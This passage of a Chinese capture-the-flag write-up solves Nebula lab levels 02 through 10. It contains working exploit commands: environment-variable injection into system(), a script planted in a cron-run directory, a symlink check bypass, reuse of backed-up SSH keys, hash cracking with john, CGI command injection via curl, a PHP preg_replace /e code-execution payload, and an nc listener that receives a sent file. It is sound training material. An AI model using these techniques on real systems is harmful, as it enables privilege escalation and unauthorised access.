<p>这题很简单，主要在 <code>getenv(&quot;USER&quot;)</code> 函数，该函数是获得shell的变量$USER<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="variable">$USER</span></span><br><span class="line">level02</span><br></pre></td></tr></table></figure></p>
<p>所以只要更改该值，以达到我们能get flag02用户shell的目的<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span><span class="constant">USER=</span><span class="string">";bash;"</span></span><br><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>./flag02</span><br><span class="line">about to call system(<span class="string">"/bin/echo ;bash; is cool"</span>)</span><br><span class="line"></span><br><span class="line">flag02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<h1 id="Level03">Level03</h1><p>这题有个定时脚本，每隔几分钟运行一个：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#!/bin/sh</span><br><span class="line"></span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /home/flag03/writable.d/* ; <span class="keyword">do</span></span><br><span class="line">    (<span class="built_in">ulimit</span> -t <span class="number">5</span>; bash -x <span class="string">"<span class="variable">$i</span>"</span>)</span><br><span class="line">    rm <span class="operator">-f</span> <span class="string">"<span class="variable">$i</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>这是一个 flag03用户运行的定时脚本，运行writable.d中的文件，运行结束后删除，不是很清楚这题的意义所在，/home/flag03/writable.d文件夹可写，那就写个脚本呗：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03/writable.d$ vim getflag.sh</span><br><span class="line"><span class="shebang">#!/bin/bash</span></span><br><span class="line">getflag &gt; a.out</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure></p>
<p>等会，你就会发现getflag.sh文件不见了，/home/flag03 下多出了a.out文件<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level03<span class="variable">@nebula</span><span class="symbol">:/home/flag03</span><span class="variable">$ </span>cat a.out</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<p>恕我才疏学浅，这题并不懂该如何getshell，不过感觉这样和getshell没啥区别，想运行啥直接写脚本里就好了</p>
<h1 id="Level04">Level04</h1><p>源码审计：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag04.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;fcntl.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> fd, rc;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)  &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s [file to read]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>((argv[<span class="number">1</span>], <span class="string">"token"</span>) != NULL) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You may not access '%s'\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == -<span class="number">1</span>) &#123;</span><br><span class="line">        err(EXIT_FAILURE, <span class="string">"Unable to open %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    rc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (rc == -<span class="number">1</span>) &#123;</span><br><span class="line">        err(EXIT_FAILURE, <span class="string">"Unable to read fd %d"</span>, fd);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    write(<span class="number">1</span>, buf, rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这题的目的是读取/home/flag04/token文件，可是该文件对level04用户没有可读权限，然后通过flag04程序的限制读取token文件，flag04的源码如上。这里我陷入了一个误区了，以为对token文件啥权限都没有，所以注意里都放在代码上了，后面看了lightless的writeup才知道，没有权限的情况下仍然可以进行软链接。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level04<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>ln -s /home/flag04/token /tmp/fff</span><br><span class="line">level04<span class="variable">@nebula</span><span class="symbol">:/home/flag04</span><span class="variable">$ </span>./flag04 /tmp/fff</span><br><span class="line"><span class="number">0650</span>8b5e-<span class="number">8909</span>-<span class="number">4</span>f38-b63<span class="number">0</span>-fdb148a848a2</span><br></pre></td></tr></table></figure></p>
<h1 id="Level05">Level05</h1><p>这题很简单，在 <code>/home/flag05</code> 目录下多出了 <code>.backup</code> 和 <code>.ssh</code> 目录，<code>.ssh</code> 目录没有可读权限，<code>.backup</code>里有个压缩文件，copy到自己的目录下解压。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:/home/flag05/</span>.backup<span class="variable">$ </span>cp backup-<span class="number">19072011</span>.tgz /home/level05</span><br><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:/home/flag05/</span>.backup<span class="variable">$ </span>cd /home/level05</span><br><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:/home/level05</span><span class="variable">$ </span>tar zvxf backup-<span class="number">19072011</span>.tgz</span><br></pre></td></tr></table></figure></p>
<p>解压出来了三个文件</p>
<ul>
<li>authorized_keys</li>
<li>id_rsa</li>
<li>id_rsa.pub<br>猜测这就是 <code>.ssh</code> 目录里的内容，所以可以直接ssh免密登录了<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>ssh flag05<span class="variable">@127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br><span class="line">flag05<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="Level06">Level06</h1><p>这题涨姿势了，要我自己做，肯定是做不出来的，根据题目提示，到 <code>/home/flag06</code> 里去看，啥有用的也没发现，然后看了LL的wp后，才知道，重点是在 <code>/etc/password</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag06<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>cat /etc/passwd|grep flag06</span><br><span class="line"><span class="symbol">flag06:</span><span class="symbol">ueqwOCnSGdsuM:</span><span class="number">993</span><span class="symbol">:</span><span class="number">993</span><span class="symbol">:</span><span class="symbol">:/home/flag06</span><span class="symbol">:/bin/sh</span></span><br></pre></td></tr></table></figure>
<p>我猜测，这题的目的是让我们学如何破linux密码，但是<code>/etc/shadow</code> 普通用户不可读，所以把flag06在shadow的内容复制到passwd中</p>
<p>所以接下来就是破密码了, 使用 john命令，通过apt直接安装：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get <span class="operator"><span class="keyword">install</span> john</span><br><span class="line">......</span><br><span class="line">$ cat passwd</span><br><span class="line">flag06:ueqwOCnSGdsuM:<span class="number">993</span>:<span class="number">993</span>::/home/flag06:/<span class="keyword">bin</span>/sh</span><br><span class="line">$ john passwd</span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (descrypt, traditional crypt(<span class="number">3</span>) [DES <span class="number">128</span>/<span class="number">128</span> SSE2-<span class="number">16</span>])</span><br><span class="line">Press <span class="string">'q'</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> abort, almost <span class="keyword">any</span> other <span class="keyword">key</span> <span class="keyword">for</span> <span class="keyword">status</span></span><br><span class="line">hello            (flag06)</span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> <span class="number">100</span>% <span class="number">2</span>/<span class="number">3</span> <span class="number">2.631</span>g/s <span class="number">1981</span>p/s <span class="number">1981</span>c/s <span class="number">1981</span>C/s <span class="number">123456.</span>.marley</span><br><span class="line"><span class="keyword">Use</span> the <span class="string">"--show"</span> <span class="keyword">option</span> <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line"><span class="keyword">Session</span> completed</span></span><br></pre></td></tr></table></figure>
<p>密码：hello<br>然后ssh登录，getflag</p>
<h1 id="Level07">Level07</h1><p>这题是perl的代码审计<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="sub"><span class="keyword">sub</span> ping &#123;</span></span><br><span class="line">  <span class="variable">$host</span> = <span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">@output</span> = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> <span class="variable">$line</span> (<span class="variable">@output</span>) &#123; <span class="keyword">print</span> <span class="string">"<span class="variable">$line</span>"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></span><br><span class="line"></span><br><span class="line">ping(param(<span class="string">"Host"</span>));</span><br></pre></td></tr></table></figure></p>
<p>虽然不懂Perl，但一看下就是$host没做任何过滤，所以可能会存在命令执行漏洞。这个脚本位于 <code>/home/flag07/index.cgi</code>, 然后通过 <code>thttpd.conf</code> 可知，这应该是使用http协议，监听了7007端口，然后接收Host参数，所以</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl  http://<span class="number">192.168</span>.<span class="number">56.101</span>:<span class="number">7007</span>/index.cgi\?Host\=<span class="string">"127.0.0||whoami;"</span> </span><br><span class="line"><span class="variable">&lt;html&gt;</span><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>Ping results<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span><span class="variable">&lt;body&gt;</span><span class="variable">&lt;pre&gt;</span>flag07</span><br><span class="line"><span class="variable">&lt;/pre&gt;</span><span class="variable">&lt;/body&gt;</span><span class="variable">&lt;/html&gt;</span></span><br><span class="line">$ curl  http://<span class="number">192.168</span>.<span class="number">56.101</span>:<span class="number">7007</span>/index.cgi\?Host\=<span class="string">"127.0.0||getflag;"</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>Ping results<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span><span class="variable">&lt;body&gt;</span><span class="variable">&lt;pre&gt;</span>You have successfully executed getflag <span class="keyword">on</span> a target account</span><br><span class="line"><span class="variable">&lt;/pre&gt;</span><span class="variable">&lt;/body&gt;</span><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是最简单的方法，因为这题的目的就是让我们getflag, 不过还可以进行提高，怎么getshell呢？去看LL菊苣的wp吧。。。。我没做出来。。thttpd一直报400错误。。</p>
<h1 id="Level08">Level08</h1><p>这题是流量审计，在 <code>/home/flag08</code> 里面有一个pcap文件，拖到本地用Wireshark，然后发现全是TCP包，然后有些是包含一些不全的数据，这时候可以使用wireshark跟踪tcp流的功能</p>
<blockquote>
<p>右击任意一个TCP包，点击Follow TCP Stream<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-tcpl.png" alt="tcpl"></p>
</blockquote>
<p>然后查看密码的十六进制<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-tcpl2.png" alt="tcpl"></p>
<p>可知中间跟了几个0x7f(DEL)，所以密码是 <code>backd00Rmate</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh flag08<span class="variable">@nebula</span></span><br><span class="line">flag08<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level09">Level09</h1><p>这题是php代码审计:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">(<span class="variable">$email</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="variable">$email</span> = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, <span class="variable">$email</span>);</span><br><span class="line">  <span class="variable">$email</span> = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, <span class="variable">$email</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$email</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">(<span class="variable">$filename</span>, <span class="variable">$use_me</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="variable">$contents</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, <span class="variable">$contents</span>);</span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, <span class="variable">$contents</span>);</span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, <span class="variable">$contents</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = markup(<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$argv</span>[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题有两个可控点，<code>$filename</code>和<code>$use_me</code><br>然后涉及到两个知识点，一个是preg_replace已经被弃用的的/e(见[<a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval" target="_blank" rel="external">http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval</a>])<br>会转义单引号，双引号，反斜杠和NULL，然后还会执行spam(“\2”)。。然后涉及到第二个知识点([ttp://php.net/manual/en/language.types.string.php#language.types.string.parsing]):<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level09<span class="variable">@nebula</span><span class="symbol">:/home/flag09</span><span class="variable">$ </span>vim /tmp/payload</span><br><span class="line">[email &#123;<span class="variable">$&#123;</span>system(<span class="variable">$use_me</span>)&#125;&#125;]</span><br><span class="line">level09<span class="variable">@nebula</span><span class="symbol">:/home/flag09</span><span class="variable">$ </span>./flag09 /tmp/payload whoami</span><br><span class="line">flag09</span><br><span class="line">level09<span class="variable">@nebula</span><span class="symbol">:/home/flag09</span><span class="variable">$ </span>./flag09 /tmp/payload getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<h1 id="Level10">Level10</h1><p>这题又是C代码审计，本题目标是读取token文件内容<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;errno.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *file;</span><br><span class="line">  <span class="keyword">char</span> *host;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s file host\n\tsends file to host if you have access to it\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  file = argv[<span class="number">1</span>];</span><br><span class="line">  host = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(access(argv[<span class="number">1</span>], R_OK) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> fd;</span><br><span class="line">      <span class="keyword">int</span> ffd;</span><br><span class="line">      <span class="keyword">int</span> rc;</span><br><span class="line">      <span class="keyword">struct</span> sockaddr_in <span class="built_in">sin</span>;</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connecting to %s:18211 .. "</span>, host); fflush(stdout);</span><br><span class="line"></span><br><span class="line">      fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">      <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">      <span class="built_in">sin</span>.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">      <span class="built_in">sin</span>.sin_port = htons(<span class="number">18211</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(connect(fd, (<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in)) == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to connect to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> HITHERE ".oO Oo.\n"</span></span><br><span class="line">      <span class="keyword">if</span>(write(fd, HITHERE, <span class="built_in">strlen</span>(HITHERE)) == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to write banner to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">undef</span> HITHERE</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connected!\nSending file .. "</span>); fflush(stdout);</span><br><span class="line"></span><br><span class="line">      ffd = open(file, O_RDONLY);</span><br><span class="line">      <span class="keyword">if</span>(ffd == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Damn. Unable to open file\n"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      rc = read(ffd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="keyword">if</span>(rc == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to read from file: %s\n"</span>, strerror(errno));</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      write(fd, buffer, rc);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wrote file!\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You don't have access to %s\n"</span>, file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们需要给该程序传递两个参数，一个file(文件名), 一个host(主机名)，这个程序的功能是，先检查file是否可读，如果可读，则与host:18211建立tcp连接，然后open(file)，发送文件内容。如下测试该程序功能：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">level10@nebula:/home/flag10$ vim /tmp/a</span><br><span class="line"><span class="header">ffffff</span><br><span class="line">--------</span></span><br><span class="line">; 在本机(192.168.56.1)上</span><br><span class="line">$ while [ 1 ];do nc -l 18211; done</span><br><span class="line"><span class="code">--------</span><br><span class="line">level10@nebula:/home/flag10$ ./flag10 /tmp/a 192.168.56.1</span><br><span class="line">Connecting to 192.168.56.1:18211 .. Connected!</span><br><span class="line">Sending file .. wrote file!</span><br><span class="line">--------</span></span><br><span class="line">; 本机</span><br><span class="line"><span class="title">.oO Oo.</span></span><br><span class="line">ffffff</span><br></pre></td></tr></table></figure></p>
